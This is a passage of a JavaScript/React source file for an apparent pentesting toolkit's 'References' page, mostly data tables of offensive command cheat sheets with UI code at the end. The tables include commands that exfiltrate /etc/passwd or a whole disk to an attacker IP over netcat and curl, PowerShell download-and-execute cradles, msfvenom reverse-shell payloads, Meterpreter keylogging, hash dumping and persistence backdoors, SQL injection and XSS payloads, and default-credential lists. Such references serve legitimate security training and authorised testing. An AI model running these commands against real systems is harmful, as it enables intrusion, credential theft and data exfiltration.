    { cmd: 'sshuttle', desc: 'VPN-like routing over SSH', example: 'sshuttle -r user@jump 10.0.0.0/8' },
    { cmd: 'plink.exe -L', desc: 'Windows PuTTY CLI local forward', example: 'plink.exe -ssh -L 8080:10.0.0.5:80 user@jump' },
    { cmd: 'plink.exe -R', desc: 'Windows reverse forward', example: 'plink.exe -ssh -R 4444:127.0.0.1:445 user@jump' },
    { cmd: 'plink.exe -D', desc: 'Windows dynamic SOCKS', example: 'plink.exe -ssh -D 1080 user@jump -N' },
    { cmd: 'meterpreter portfwd', desc: 'MSF session port forward', example: 'portfwd add -l 3306 -p 3306 -r 10.0.0.5' },
    { cmd: 'meterpreter route', desc: 'Route subnet through Meterpreter', example: 'run autoroute -s 10.0.0.0/24' },
    { cmd: 'netsh interface portproxy', desc: 'Windows built-in port proxy (admin)', example: 'netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.0.0.5' },
    { cmd: 'rpivot socks', desc: 'Reverse SOCKS over HTTP (legacy)', example: 'python server.py --server-port 9999 --server-ip 0.0.0.0' },
    { cmd: 'gost / cloudflared', desc: 'Modern tunnel tools (compare to ngrok)', example: 'cloudflared tunnel --url http://localhost:8080' },
  ],
};

// ─── FILE TRANSFER ──────────────────────────────────
const transferData = {
  'File Transfer': [
    { cmd: 'python3 -m http.server', desc: 'Simple HTTP server (Python 3)', example: 'cd /loot && python3 -m http.server 8000' },
    { cmd: 'python2 SimpleHTTPServer', desc: 'Legacy Python 2 server', example: 'python -m SimpleHTTPServer 8000' },
    { cmd: 'php -S', desc: 'Built-in PHP web server', example: 'php -S 0.0.0.0:8080 -t /var/www' },
    { cmd: 'ruby -run', desc: 'One-liner HTTP server', example: 'ruby -run -e httpd . -p 8000' },
    { cmd: 'nc send file', desc: 'Push file to listener', example: '# target: nc -w3 10.10.14.5 4444 < /etc/passwd\n# attacker: nc -lvnp 4444 > passwd' },
    { cmd: 'nc receive file', desc: 'Pull file from sender', example: '# attacker: nc -lvnp 4444 < shell.sh\n# target: nc 10.10.14.5 4444 > /tmp/shell.sh' },
    { cmd: 'curl upload', desc: 'PUT/POST file to attacker', example: 'curl -T /etc/passwd http://10.10.14.5:8000/passwd' },
    { cmd: 'curl download', desc: 'Save remote file', example: 'curl -fsSL http://10.10.14.5/linpeas.sh -o /tmp/linpeas.sh' },
    { cmd: 'wget download', desc: 'Fetch file recursively / continue', example: 'wget http://10.10.14.5/shell.exe -O C:\\\\Temp\\\\s.exe' },
    { cmd: 'certutil encode/decode', desc: 'Windows base64 file transfer', example: 'certutil -urlcache -split -f http://10.10.14.5/s.exe s.exe' },
    { cmd: 'certutil -encode', desc: 'Encode binary to text for exfil', example: 'certutil -encode payload.exe payload.b64 && type payload.b64' },
    { cmd: 'bitsadmin', desc: 'Background download (older Windows)', example: 'bitsadmin /transfer job http://10.10.14.5/s.exe C:\\\\temp\\\\s.exe' },
    { cmd: 'IWR IEX cradle', desc: 'PowerShell download-execute', example: 'powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.14.5/r.ps1\')"' },
    { cmd: 'Invoke-WebRequest OutFile', desc: 'PowerShell save file', example: 'Invoke-WebRequest -Uri http://10.10.14.5/mimikatz.exe -OutFile .\\m.exe' },
    { cmd: 'scp push', desc: 'Copy file over SSH', example: 'scp ./loot.zip user@10.10.14.5:/tmp/' },
    { cmd: 'scp pull', desc: 'Download from remote SSH', example: 'scp user@target:/etc/passwd ./passwd' },
    { cmd: 'smbclient put', desc: 'Upload to SMB share', example: 'smbclient //10.10.10.5/share -U user%pass -c "put local.txt"' },
    { cmd: 'impacket-smbserver', desc: 'Attacker SMB share for Windows copy', example: 'impacket-smbserver share $(pwd) -smb2support' },
    { cmd: 'net use + copy', desc: 'Map attacker share from Windows', example: 'net use Z: \\\\10.10.14.5\\share /user:user pass && copy Z:\\\\tool.exe .' },
    { cmd: 'base64 copy-paste', desc: 'ASCII exfil through clipboard/terminal', example: 'base64 -w0 secret.zip | xclip -sel c' },
    { cmd: 'PowerShell b64 load', desc: 'Decode and run assembly/script', example: '[Convert]::FromBase64String("TVqQAAMAAAA...") | Set-Content -Encoding Byte .\\x.exe' },
    { cmd: 'ftp script', desc: 'Non-interactive FTP get/put', example: 'echo open 10.10.14.5>ftp.txt && echo user anon>>ftp.txt && echo binary>>ftp.txt && echo get file.exe>>ftp.txt' },
    { cmd: 'dd + nc', desc: 'Raw disk/image over netcat', example: 'dd if=/dev/sda | nc 10.10.14.5 4444' },
  ],
};

// ─── NMAP ───────────────────────────────────────────
const nmapData = {
  'Scan Types': [
    { cmd: '-sS', desc: 'TCP SYN scan (stealth, default for root)', example: 'nmap -sS 10.10.10.1' },
    { cmd: '-sT', desc: 'TCP connect scan (full handshake, no root needed)', example: 'nmap -sT 10.10.10.1' },
    { cmd: '-sU', desc: 'UDP scan', example: 'nmap -sU --top-ports 100 10.10.10.1' },
    { cmd: '-sV', desc: 'Service version detection', example: 'nmap -sV -p 80,443 10.10.10.1' },
    { cmd: '-sC', desc: 'Run default NSE scripts', example: 'nmap -sC 10.10.10.1' },
    { cmd: '-O', desc: 'OS detection', example: 'nmap -O 10.10.10.1' },
    { cmd: '-A', desc: 'Aggressive scan (OS + version + scripts + traceroute)', example: 'nmap -A 10.10.10.1' },
    { cmd: '-sn', desc: 'Ping scan (host discovery, no port scan)', example: 'nmap -sn 10.10.10.0/24' },
    { cmd: '-Pn', desc: 'Skip host discovery (assume host is up)', example: 'nmap -Pn 10.10.10.1' },
    { cmd: '-sA', desc: 'ACK scan (detect firewalls)', example: 'nmap -sA 10.10.10.1' },
  ],
  'Port Specification': [
    { cmd: '-p', desc: 'Specify ports to scan', example: 'nmap -p 80,443,8080 10.10.10.1' },
    { cmd: '-p-', desc: 'Scan all 65535 ports', example: 'nmap -p- 10.10.10.1' },
    { cmd: '--top-ports', desc: 'Scan N most common ports', example: 'nmap --top-ports 1000 10.10.10.1' },
    { cmd: '-p 1-1024', desc: 'Scan port range', example: 'nmap -p 1-1024 10.10.10.1' },
  ],
  'Timing & Performance': [
    { cmd: '-T0', desc: 'Paranoid — IDS evasion (very slow)', example: 'nmap -T0 10.10.10.1' },
    { cmd: '-T1', desc: 'Sneaky — IDS evasion', example: 'nmap -T1 10.10.10.1' },
    { cmd: '-T2', desc: 'Polite — slows scan to use less bandwidth', example: 'nmap -T2 10.10.10.1' },
    { cmd: '-T3', desc: 'Normal — default timing', example: 'nmap -T3 10.10.10.1' },
    { cmd: '-T4', desc: 'Aggressive — faster scan (recommended for CTFs)', example: 'nmap -T4 10.10.10.1' },
    { cmd: '-T5', desc: 'Insane — fastest, may miss ports', example: 'nmap -T5 10.10.10.1' },
    { cmd: '--min-rate', desc: 'Minimum packets per second', example: 'nmap --min-rate 5000 -p- 10.10.10.1' },
  ],
  'Output': [
    { cmd: '-oN', desc: 'Normal output to file', example: 'nmap -oN scan.txt 10.10.10.1' },
    { cmd: '-oX', desc: 'XML output', example: 'nmap -oX scan.xml 10.10.10.1' },
    { cmd: '-oG', desc: 'Grepable output', example: 'nmap -oG scan.gnmap 10.10.10.1' },
    { cmd: '-oA', desc: 'All formats at once (N + X + G)', example: 'nmap -oA full_scan 10.10.10.1' },
    { cmd: '-v / -vv', desc: 'Increase verbosity', example: 'nmap -vv -sS 10.10.10.1' },
  ],
  'NSE Scripts': [
    { cmd: '--script', desc: 'Run specific NSE script(s)', example: 'nmap --script http-enum 10.10.10.1' },
    { cmd: '--script-args', desc: 'Pass arguments to scripts', example: "nmap --script http-brute --script-args 'userdb=users.txt,passdb=pass.txt' 10.10.10.1" },
    { cmd: '--script vuln', desc: 'Run vulnerability detection scripts', example: 'nmap --script vuln 10.10.10.1' },
    { cmd: '--script discovery', desc: 'Run discovery scripts', example: 'nmap --script discovery 10.10.10.1' },
    { cmd: '--script auth', desc: 'Run authentication audit scripts', example: 'nmap --script auth 10.10.10.1' },
    { cmd: '--script brute', desc: 'Run brute-force scripts', example: 'nmap --script brute 10.10.10.1' },
    { cmd: '--script exploit', desc: 'Run exploit scripts', example: 'nmap --script exploit 10.10.10.1' },
    { cmd: '--script smb-enum-*', desc: 'Enumerate SMB shares, users, sessions', example: 'nmap --script smb-enum-shares,smb-enum-users -p 445 10.10.10.1' },
  ],
  'Common Combos': [
    { cmd: 'Quick scan', desc: 'Fast scan of top 100 ports with version detection', example: 'nmap -sV --top-ports 100 -T4 10.10.10.1' },
    { cmd: 'Full TCP scan', desc: 'All ports, version, scripts, OS', example: 'nmap -sC -sV -O -p- -T4 -oA full 10.10.10.1' },
    { cmd: 'Vuln scan', desc: 'Scan for known vulnerabilities', example: 'nmap --script vuln -sV -p- -T4 10.10.10.1' },
    { cmd: 'Stealth scan', desc: 'SYN scan with slow timing and decoy', example: 'nmap -sS -T1 -D RND:10 -f 10.10.10.1' },
    { cmd: 'UDP quick scan', desc: 'Top UDP ports with version detection', example: 'nmap -sU -sV --top-ports 50 -T4 10.10.10.1' },
    { cmd: 'Network sweep', desc: 'Discover live hosts on subnet', example: 'nmap -sn 10.10.10.0/24 -oG - | grep "Up"' },
    { cmd: 'Aggressive full', desc: 'Everything: all ports + aggressive + output', example: 'nmap -A -p- -T4 --min-rate 5000 -oA aggressive 10.10.10.1' },
  ],
};

// ─── METASPLOIT ─────────────────────────────────────
const metasploitData = {
  'Console Basics': [
    { cmd: 'msfconsole', desc: 'Launch Metasploit Framework console', example: 'msfconsole -q' },
    { cmd: 'search', desc: 'Search for modules by name, CVE, platform', example: 'search type:exploit platform:windows smb' },
    { cmd: 'use', desc: 'Select a module', example: 'use exploit/windows/smb/ms17_010_eternalblue' },
    { cmd: 'info', desc: 'Show detailed module information', example: 'info exploit/windows/smb/ms17_010_eternalblue' },
    { cmd: 'show options', desc: 'Display required/optional parameters', example: 'show options' },
    { cmd: 'set', desc: 'Set module parameter', example: 'set RHOSTS 10.10.10.1' },
    { cmd: 'setg', desc: 'Set global parameter (persists across modules)', example: 'setg LHOST 10.10.14.5' },
    { cmd: 'run / exploit', desc: 'Execute the module', example: 'exploit -j' },
    { cmd: 'back', desc: 'Exit current module context', example: 'back' },
    { cmd: 'sessions', desc: 'List active sessions', example: 'sessions -l' },
    { cmd: 'sessions -i', desc: 'Interact with a session', example: 'sessions -i 1' },
  ],
  'Msfvenom Payloads': [
    { cmd: 'Linux ELF', desc: 'Linux reverse shell binary', example: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf' },
    { cmd: 'Windows EXE', desc: 'Windows reverse shell executable', example: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe' },
    { cmd: 'WAR', desc: 'Java web archive (Tomcat)', example: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war' },
    { cmd: 'PHP', desc: 'PHP reverse shell', example: "msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php" },
    { cmd: 'ASP', desc: 'ASP reverse shell (IIS)', example: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp' },
    { cmd: 'JSP', desc: 'JSP reverse shell', example: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.jsp' },
    { cmd: 'Python', desc: 'Python reverse shell one-liner', example: 'msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw' },
    { cmd: 'Bash', desc: 'Bash reverse shell one-liner', example: 'msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw' },
    { cmd: 'DLL', desc: 'Windows DLL payload', example: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o payload.dll' },
  ],
  'Handler Setup': [
    { cmd: 'multi/handler', desc: 'Generic payload handler for catching shells', example: 'use exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 10.10.14.5\nset LPORT 4444\nrun' },
    { cmd: 'AutoRunScript', desc: 'Auto-run script on session creation', example: 'set AutoRunScript post/windows/manage/migrate' },
    { cmd: 'ExitOnSession', desc: 'Keep handler running after session', example: 'set ExitOnSession false\nexploit -j' },
  ],
  'Meterpreter Commands': [
    { cmd: 'sysinfo', desc: 'Show target system information', example: 'sysinfo' },
    { cmd: 'getuid', desc: 'Show current user', example: 'getuid' },
    { cmd: 'getsystem', desc: 'Attempt privilege escalation to SYSTEM', example: 'getsystem' },
    { cmd: 'hashdump', desc: 'Dump SAM database password hashes', example: 'hashdump' },
    { cmd: 'migrate', desc: 'Migrate to another process', example: 'migrate -N explorer.exe' },
    { cmd: 'shell', desc: 'Drop into system shell', example: 'shell' },
    { cmd: 'upload / download', desc: 'Transfer files to/from target', example: 'upload /tmp/linpeas.sh /tmp/\ndownload C:\\\\Users\\\\admin\\\\flag.txt /tmp/' },
    { cmd: 'portfwd', desc: 'Port forwarding through session', example: 'portfwd add -l 8080 -p 80 -r 172.16.1.10' },
    { cmd: 'keyscan_start', desc: 'Start keystroke capture', example: 'keyscan_start\nkeyscan_dump\nkeyscan_stop' },
    { cmd: 'screenshot', desc: 'Take screenshot of target desktop', example: 'screenshot' },
    { cmd: 'persistence', desc: 'Install persistence backdoor', example: 'run persistence -U -i 30 -p 4444 -r 10.10.14.5' },
  ],
  'Post-Exploitation Modules': [
    { cmd: 'post/multi/recon/local_exploit_suggester', desc: 'Suggest local privilege escalation exploits', example: 'run post/multi/recon/local_exploit_suggester' },
    { cmd: 'post/windows/gather/enum_logged_on_users', desc: 'Enumerate logged-on users', example: 'run post/windows/gather/enum_logged_on_users' },
    { cmd: 'post/windows/gather/credentials/*', desc: 'Extract stored credentials', example: 'run post/windows/gather/credentials/credential_collector' },
    { cmd: 'post/linux/gather/enum_configs', desc: 'Enumerate Linux config files', example: 'run post/linux/gather/enum_configs' },
    { cmd: 'auxiliary/scanner/portscan/tcp', desc: 'Pivot: scan internal network through session', example: 'use auxiliary/scanner/portscan/tcp\nset RHOSTS 172.16.1.0/24\nset PORTS 22,80,443,445\nrun' },
  ],
};

// ─── WEB ────────────────────────────────────────────
const webData = {
  'HTTP Methods': [
    { cmd: 'GET', desc: 'Retrieve a resource', example: 'curl -X GET http://target/api/users' },
    { cmd: 'POST', desc: 'Submit data to create a resource', example: "curl -X POST -d '{\"user\":\"admin\"}' -H 'Content-Type: application/json' http://target/api/users" },
    { cmd: 'PUT', desc: 'Update/replace a resource', example: "curl -X PUT -d '{\"role\":\"admin\"}' http://target/api/users/1" },
    { cmd: 'PATCH', desc: 'Partially update a resource', example: "curl -X PATCH -d '{\"email\":\"pwned@evil.com\"}' http://target/api/users/1" },
    { cmd: 'DELETE', desc: 'Delete a resource', example: 'curl -X DELETE http://target/api/users/1' },
    { cmd: 'OPTIONS', desc: 'Show allowed methods (CORS preflight)', example: 'curl -X OPTIONS -v http://target/api/' },
    { cmd: 'HEAD', desc: 'GET without response body (header check)', example: 'curl -I http://target/' },
    { cmd: 'TRACE', desc: 'Echoes request back (XST attacks)', example: 'curl -X TRACE http://target/' },
  ],
  'HTTP Status Codes': [
    { cmd: '200 OK', desc: 'Request succeeded', example: 'Standard success response' },
    { cmd: '201 Created', desc: 'Resource created successfully', example: 'Returned after successful POST' },
    { cmd: '301 Moved Permanently', desc: 'Permanent redirect (follow with -L)', example: 'curl -L http://target/old-page' },
    { cmd: '302 Found', desc: 'Temporary redirect (often login redirects)', example: 'Watch for redirect loops in auth bypass' },
    { cmd: '400 Bad Request', desc: 'Malformed request syntax', example: 'Check for parameter injection opportunities' },
    { cmd: '401 Unauthorized', desc: 'Authentication required', example: 'Try default creds, brute force, auth bypass' },
    { cmd: '403 Forbidden', desc: 'Server refuses to fulfill request', example: 'Try path traversal, verb tampering, header tricks' },
    { cmd: '404 Not Found', desc: 'Resource does not exist', example: 'Use for directory brute-forcing confirmation' },
    { cmd: '405 Method Not Allowed', desc: 'HTTP method not supported', example: 'Try alternative methods (PUT, DELETE, PATCH)' },
    { cmd: '500 Internal Server Error', desc: 'Server-side error (possible injection)', example: 'Often indicates SQL injection or SSTI' },
    { cmd: '502 Bad Gateway', desc: 'Upstream server error', example: 'Proxy/load balancer misconfiguration' },
    { cmd: '503 Service Unavailable', desc: 'Server overloaded or maintenance', example: 'Potential DoS indicator' },
  ],
  'Common Headers': [
    { cmd: 'Authorization', desc: 'Authentication credentials', example: 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...' },
    { cmd: 'Cookie', desc: 'Client cookies sent with request', example: 'Cookie: session=abc123; PHPSESSID=xyz789' },
    { cmd: 'X-Forwarded-For', desc: 'Client IP (bypass IP restrictions)', example: 'X-Forwarded-For: 127.0.0.1' },
    { cmd: 'X-Original-URL', desc: 'Override URL path (403 bypass)', example: 'X-Original-URL: /admin' },
    { cmd: 'X-Rewrite-URL', desc: 'Rewrite URL path (403 bypass)', example: 'X-Rewrite-URL: /admin' },
    { cmd: 'Content-Type', desc: 'Media type of request body', example: 'Content-Type: application/json' },
    { cmd: 'User-Agent', desc: 'Client identification string', example: 'User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)' },
    { cmd: 'Referer', desc: 'Previous page URL', example: 'Referer: http://target/admin' },
    { cmd: 'Host', desc: 'Target hostname (virtual host routing)', example: 'Host: admin.target.internal' },
  ],
  'OWASP Top 10 Quick Ref': [
    { cmd: 'A01: Broken Access Control', desc: 'IDOR, forced browsing, missing auth checks', example: "curl http://target/api/users/2 (access other user's data)" },
    { cmd: 'A02: Cryptographic Failures', desc: 'Weak crypto, plaintext secrets, bad TLS', example: 'Check for HTTP, weak ciphers, exposed .env files' },
    { cmd: 'A03: Injection', desc: 'SQLi, XSS, OS command injection, LDAP', example: "' OR 1=1-- -  |  <script>alert(1)</script>  |  ; ls -la" },
    { cmd: 'A04: Insecure Design', desc: 'Missing rate limits, logic flaws', example: 'Unlimited password reset attempts, predictable tokens' },
    { cmd: 'A05: Security Misconfiguration', desc: 'Default creds, open cloud storage, verbose errors', example: 'Check /server-status, /phpinfo.php, directory listing' },
    { cmd: 'A06: Vulnerable Components', desc: 'Outdated libraries with known CVEs', example: 'Check versions in response headers, use searchsploit' },
    { cmd: 'A07: Auth Failures', desc: 'Weak passwords, missing MFA, session flaws', example: 'Test default creds, brute force, session fixation' },
    { cmd: 'A08: Software & Data Integrity', desc: 'Insecure deserialization, CI/CD attacks', example: 'Test Java/PHP deserialization, check SRI on CDN scripts' },
    { cmd: 'A09: Logging & Monitoring Failures', desc: 'No audit trail, unmonitored attacks', example: 'Check if login failures are logged, test log injection' },
    { cmd: 'A10: SSRF', desc: 'Server-Side Request Forgery', example: 'curl http://target/fetch?url=http://169.254.169.254/latest/meta-data/' },
  ],
  'Interesting File Paths': [
    { cmd: '/robots.txt', desc: 'Disallowed paths for crawlers', example: 'curl http://target/robots.txt' },
    { cmd: '/.git/', desc: 'Exposed git repository (source code leak)', example: 'curl http://target/.git/HEAD' },
    { cmd: '/.env', desc: 'Environment variables (DB creds, API keys)', example: 'curl http://target/.env' },
    { cmd: '/wp-admin/', desc: 'WordPress admin login', example: 'curl http://target/wp-login.php' },
    { cmd: '/phpinfo.php', desc: 'PHP configuration info', example: 'curl http://target/phpinfo.php' },
    { cmd: '/server-status', desc: 'Apache server status page', example: 'curl http://target/server-status' },
    { cmd: '/.htaccess', desc: 'Apache config (rewrite rules, auth)', example: 'curl http://target/.htaccess' },
    { cmd: '/wp-config.php', desc: 'WordPress database credentials', example: 'curl http://target/wp-config.php.bak' },
    { cmd: '/api/', desc: 'API root (check for docs)', example: 'curl http://target/api/swagger.json' },
    { cmd: '/sitemap.xml', desc: 'Site map with all URLs', example: 'curl http://target/sitemap.xml' },
    { cmd: '/.svn/', desc: 'Subversion repository data', example: 'curl http://target/.svn/entries' },
    { cmd: '/backup/', desc: 'Backup files and directories', example: 'curl http://target/backup/db.sql' },
    { cmd: '/admin/', desc: 'Admin panel', example: 'curl http://target/admin/' },
    { cmd: '/console', desc: 'Werkzeug/Flask debug console', example: 'curl http://target/console' },
  ],
  'Default Credentials': [
    { cmd: 'admin:admin', desc: 'Most common default login', example: 'Almost every web app default' },
    { cmd: 'admin:password', desc: 'Classic default', example: 'Routers, CMS, IoT devices' },
    { cmd: 'root:root', desc: 'Root default credentials', example: 'Linux systems, databases' },
    { cmd: 'root:toor', desc: 'Kali Linux default root', example: 'Kali Linux, some CTFs' },
    { cmd: 'admin:admin123', desc: 'Numbered variant', example: 'Jenkins, Grafana, custom apps' },
    { cmd: 'guest:guest', desc: 'Guest access credentials', example: 'RabbitMQ, various apps' },
    { cmd: 'test:test', desc: 'Test account', example: 'Development environments' },
    { cmd: 'tomcat:tomcat', desc: 'Apache Tomcat default', example: '/manager/html (Tomcat Manager)' },
    { cmd: 'postgres:postgres', desc: 'PostgreSQL default', example: 'psql -U postgres -h target' },
    { cmd: 'sa: (empty)', desc: 'MS SQL Server sysadmin', example: 'sqsh -S target -U sa' },
    { cmd: 'pi:raspberry', desc: 'Raspberry Pi default', example: 'ssh pi@target' },
    { cmd: 'admin: (empty)', desc: 'Empty password admin', example: 'Many routers and IoT' },
  ],
  'Web Application Testing': [
    { cmd: 'gobuster dir', desc: 'Fast directory/file brute force', example: 'gobuster dir -u http://target/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50' },
    { cmd: 'gobuster vhost', desc: 'Virtual host discovery', example: 'gobuster vhost -u http://target -w subdomains.txt' },
    { cmd: 'ffuf', desc: 'Web fuzzer — rate, filters, recursion', example: 'ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,204,301,302,307,401,403' },
    { cmd: 'ffuf POST data', desc: 'Fuzz POST body parameters', example: 'ffuf -u http://target/login -X POST -d "user=FUZZ&pass=admin" -w users.txt' },
    { cmd: 'wfuzz', desc: 'Classic multi-slot fuzzer', example: 'wfuzz -c -z file,wordlist.txt --hc 404 http://target/FUZZ' },
    { cmd: 'dirsearch', desc: 'Python dir brute with extensions', example: 'dirsearch -u http://target -e php,html,bak,txt -t 40' },
    { cmd: 'nikto', desc: 'Web server misconfiguration scanner', example: 'nikto -h http://target -C all' },
    { cmd: 'whatweb', desc: 'Fingerprint CMS, frameworks, tech stack', example: 'whatweb -a 3 http://target' },
    { cmd: 'wafw00f', desc: 'Identify WAF vendor', example: 'wafw00f http://target' },
    { cmd: 'sqlmap basic', desc: 'Auto-detect and exploit SQLi', example: 'sqlmap -u "http://target/item.php?id=1" --batch' },
    { cmd: 'sqlmap cookie', desc: 'Test authenticated requests', example: 'sqlmap -u http://target/app --cookie="session=abc" --level=3 --risk=2' },
    { cmd: 'sqlmap request file', desc: 'Replay captured Burp request', example: 'sqlmap -r request.txt --batch --dbms=mysql' },
    { cmd: 'sqlmap os-shell', desc: 'OS command shell (when stacked/queries allow)', example: 'sqlmap -u "http://target/q?id=1" --os-shell --batch' },
    { cmd: 'XSStrike', desc: 'Reflected XSS probing and payloads', example: 'python3 xsstrike.py -u "http://target/search?q=test"' },
    { cmd: 'dalfox', desc: 'Parameter-based XSS scanner', example: 'dalfox url http://target/page?x=1' },
    { cmd: 'nuclei', desc: 'Template-based vuln scanner', example: 'nuclei -u http://target -t cves/ -severity critical,high' },
    { cmd: 'httpx', desc: 'Probe alive URLs, tech, status', example: 'cat hosts.txt | httpx -title -tech-detect -status-code' },
    { cmd: 'feroxbuster', desc: 'Recursive content discovery', example: 'feroxbuster -u http://target -w wordlist.txt -x php,html,js -t 50' },
    { cmd: 'arjun', desc: 'HTTP parameter discovery', example: 'arjun -u http://target/api/data -m GET' },
    { cmd: 'katana crawl', desc: 'Modern JS-aware crawler (ProjectDiscovery)', example: 'katana -u http://target -d 3' },
    { cmd: 'wpscan', desc: 'WordPress vulnerability scanner', example: 'wpscan --url http://target --enumerate u,p,t' },
    { cmd: 'commix', desc: 'Command injection automation', example: 'python commix.py -u "http://target/cmd?c=1"' },
    { cmd: 'dotdotpwn', desc: 'Directory traversal fuzzer', example: 'dotdotpwn -m http -h target -M GET' },
  ],
};

const dataMap = {
  linux: linuxData,
  windows: windowsData,
  ad: adData,
  pivot: pivotData,
  transfer: transferData,
  nmap: nmapData,
  metasploit: metasploitData,
  web: webData,
};

function ReferenceItem({ cmd, desc, example, sub }) {
  return (
    <div
      style={{
        background: '#161B28',
        border: '1px solid rgba(255,255,255,0.04)',
        borderRadius: 8,
        padding: '14px 16px',
        display: 'flex',
        flexDirection: 'column',
        gap: 8,
      }}
    >
      <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', gap: 12 }}>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 4, flex: 1, minWidth: 0 }}>
          <span style={{ fontFamily: mono, fontSize: 13, fontWeight: 600, color: '#6EE7B7' }}>{sub(cmd)}</span>
          <span style={{ fontFamily: mono, fontSize: 11, color: '#9CA3AF', lineHeight: '18px' }}>{desc}</span>
        </div>
        <CopyButton text={sub(cmd)} />
      </div>
      <div
        style={{
          background: '#0B0F18',
          borderRadius: 6,
          padding: '10px 12px',
          display: 'flex',
          alignItems: 'flex-start',
          justifyContent: 'space-between',
          gap: 8,
        }}
      >
        <pre
          style={{
            fontFamily: mono,
            fontSize: 11,
            color: '#D1D5DB',
            margin: 0,
            whiteSpace: 'pre-wrap',
            wordBreak: 'break-all',
            flex: 1,
            lineHeight: '18px',
          }}
        >
          {sub(example)}
        </pre>
        <CopyButton text={sub(example)} />
      </div>
    </div>
  );
}

function SectionBlock({ title, items, sub }) {
  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
      <div
        style={{
          fontFamily: heading,
          fontSize: 13,
          fontWeight: 700,
          color: '#D1D5DB',
          padding: '6px 0',
          borderBottom: '1px solid rgba(255,255,255,0.06)',
          marginBottom: 2,
          textTransform: 'uppercase',
          letterSpacing: '0.05em',
        }}
      >
        {title}
      </div>
      {items.map((item, idx) => (
        <ReferenceItem key={`${title}-${idx}-${item.cmd}`} {...item} sub={sub} />
      ))}
    </div>
  );
}

export default function References() {
  const [activeTab, setActiveTab] = useState('linux');
  const [search, setSearch] = useState('');
  const { vars, setVar, substitute } = useVariables();

  const filteredSections = useMemo(() => {
    const data = dataMap[activeTab] || {};
    const q = search.toLowerCase().trim();
    if (!q) return data;

    const result = {};
    for (const [section, items] of Object.entries(data)) {
      const matched = items.filter(
        (item) =>
          item.cmd.toLowerCase().includes(q) ||
          item.desc.toLowerCase().includes(q) ||
          item.example.toLowerCase().includes(q)
      );
      if (matched.length) result[section] = matched;
    }
    return result;
  }, [activeTab, search]);

  const totalResults = Object.values(filteredSections).reduce((sum, items) => sum + items.length, 0);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100%', gap: 0 }}>
      {/* Sticky header */}
      <div
        style={{
          position: 'sticky',
          top: 0,
          zIndex: 10,
          paddingBottom: 14,
          display: 'flex',
          flexDirection: 'column',
          gap: 12,
        }}
      >
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <span style={{ fontFamily: heading, fontSize: 20, fontWeight: 700, color: '#E2E8F0' }}>
              References
            </span>
            <ToolHelp title="References" description="Command cheatsheets for Linux, Windows, Active Directory, pivoting, file transfer, Nmap, Metasploit, and web testing." steps={["Select a category tab at the top","Search within commands using the search bar","Click copy on any command to grab it","Commands are organized by purpose within each category"]} tips={["Covers 500+ commands across 8 categories","Search works across command names and descriptions","Great for quick reference during engagements"]} />
            <span
              style={{
                fontFamily: mono,
                fontSize: 10,
                color: '#6EE7B7',
                background: 'rgba(110,231,183,0.08)',
                border: '1px solid rgba(110,231,183,0.15)',
                borderRadius: 5,
                padding: '3px 8px',
                fontWeight: 600,
              }}
            >
              {totalResults} entries
            </span>
          </div>
        </div>

        <Tabs tabs={tabs} defaultTab="linux" onChange={(v) => { setActiveTab(v); setSearch(''); }} />

        <VariableBar vars={vars} setVar={setVar} fields={['LHOST', 'LPORT', 'TARGET', 'DOMAIN', 'WORDLIST', 'USER']} />

        <div style={{ position: 'relative' }}>
          <Search
            size={14}
            style={{
              position: 'absolute',
              left: 12,
              top: '50%',
              transform: 'translateY(-50%)',
              color: '#6B7280',
              pointerEvents: 'none',
            }}
          />
          <Input
            placeholder={`Search ${tabs.find(t => t.value === activeTab)?.label || ''} commands...`}
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            style={{ paddingLeft: 34, width: '100%', boxSizing: 'border-box' }}
          />
        </div>
      </div>

      {/* Scrollable content */}
      <div
        style={{
          flex: 1,
          overflowY: 'auto',
          display: 'flex',
          flexDirection: 'column',
          gap: 20,
          paddingBottom: 40,
        }}
      >
        {Object.keys(filteredSections).length === 0 ? (
          <Card>
            <div
              style={{
                display: 'flex',
                flexDirection: 'column',
                alignItems: 'center',
                gap: 8,
                padding: '40px 0',
              }}
            >
              <Search size={32} style={{ color: '#4B5563' }} />
              <span style={{ fontFamily: mono, fontSize: 12, color: '#6B7280' }}>
                No results for "{search}"
              </span>
              <span style={{ fontFamily: mono, fontSize: 10, color: '#4B5563' }}>
                Try a different search term
              </span>
            </div>
          </Card>
        ) : (
          Object.entries(filteredSections).map(([section, items]) => (
            <SectionBlock key={section} title={section} items={items} sub={substitute} />
          ))
        )}
      </div>
    </div>
  );
}
